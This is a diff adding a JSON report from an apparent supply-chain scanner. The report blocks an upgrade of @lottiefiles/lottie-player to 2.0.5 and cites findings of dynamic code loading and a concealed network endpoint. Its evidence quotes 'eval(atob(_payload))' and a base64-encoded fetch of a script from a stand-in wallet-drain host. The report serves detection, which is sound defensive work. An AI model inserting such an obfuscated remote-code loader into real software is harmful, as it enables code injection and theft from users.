@@ -1,0 +1,96 @@
+{
+  "verdict": "BLOCK",
+  "findings": [
+    {
+      "detector": "code.dynamic-loading-added",
+      "category": "CODE",
+      "package": "@lottiefiles/lottie-player",
+      "from": "2.0.4",
+      "to": "2.0.5",
+      "direction": "changed",
+      "severity": "BLOCK",
+      "confidence": "high",
+      "message": "Dynamic code sink introduced (eval). [escalated: package '@lottiefiles/lottie-player' has 2 WARN findings across 2 categories] [GHSA: GHSA-cwfw-4gq5-mrqx]",
+      "evidence": [
+        {
+          "file": "index.js",
+          "line": 7,
+          "snippet": "eval(atob(_payload));"
+        }
+      ],
+      "provenance": [
+        [
+          "my-app",
+          "@lottiefiles/lottie-player"
+        ]
+      ]
+    },
+    {
+      "detector": "net.encoded-endpoint",
+      "category": "NET",
+      "package": "@lottiefiles/lottie-player",
+      "from": "2.0.4",
+      "to": "2.0.5",
+      "direction": "changed",
+      "severity": "BLOCK",
+      "confidence": "high",
+      "message": "New network endpoint concealed via base64 encoding: https://wallet-drain.example.invalid/inject.js [GHSA: GHSA-cwfw-4gq5-mrqx]",
+      "evidence": [
+        {
+          "file": "index.js",
+          "line": 2,
+          "snippet": "base64(\"ZmV0Y2goImh0dHBzOi8vd2FsbGV0LWRyYWluLmV4YW1wbGUuaW52YWxpZC9p\") → https://wallet-drain.example.invalid/inject.js"
+        }
+      ],
+      "provenance": [
+        [
+          "my-app",
+          "@lottiefiles/lottie-player"
+        ]
+      ]
+    },
+    {
+      "detector": "net.new-endpoint",
+      "category": "NET",
+      "package": "@lottiefiles/lottie-player",
+      "from": "2.0.4",
+      "to": "2.0.5",
+      "direction": "changed",
+      "severity": "BLOCK",
+      "confidence": "high",
+      "message": "New network endpoint appeared: https://wallet-drain.example.invalid/inject.js [escalated: package '@lottiefiles/lottie-player' has 2 WARN findings across 2 categories] [GHSA: GHSA-cwfw-4gq5-mrqx]",
+      "evidence": [
+        {
+          "file": "index.js",
+          "line": 1,
+          "snippet": "https://wallet-drain.example.invalid/inject.js"
+        }
+      ],
+      "provenance": [
+        [
+          "my-app",
+          "@lottiefiles/lottie-player"
+        ]
+      ]
+    }
+  ],
+  "rollupByDirect": {
+    "@lottiefiles/lottie-player": {
+      "maxSeverity": "BLOCK",
+      "count": 3
+    }
+  },
+  "changes": [
+    {
+      "kind": "upgraded",
+      "name": "@lottiefiles/lottie-player",
+      "nodeKeyOld": "node_modules/@lottiefiles/lottie-player",
+      "nodeKeyNew": "node_modules/@lottiefiles/lottie-player",
+      "oldVersion": "2.0.4",
+      "newVersion": "2.0.5",
+      "oldIntegrity": "sha512-iTl9Ip7Vvp8CtQczoPwHgHNmrfLWf61G8khWFXm7XsSq4ZNhzNjaF/BhTNGyUExvv0lZyeTKJLvk3JpdvUiUMg==",
+      "newIntegrity": "sha512-3SjJl9wFXSq9O4/dfkHVal5noUw3BGd/PnHslNuHmJ2z/1EUFKFY2w4mS0DRvwR6j67nlL2XW9rSpCgVDpprFA=="
+    }
+  ],
+  "errors": []
+}
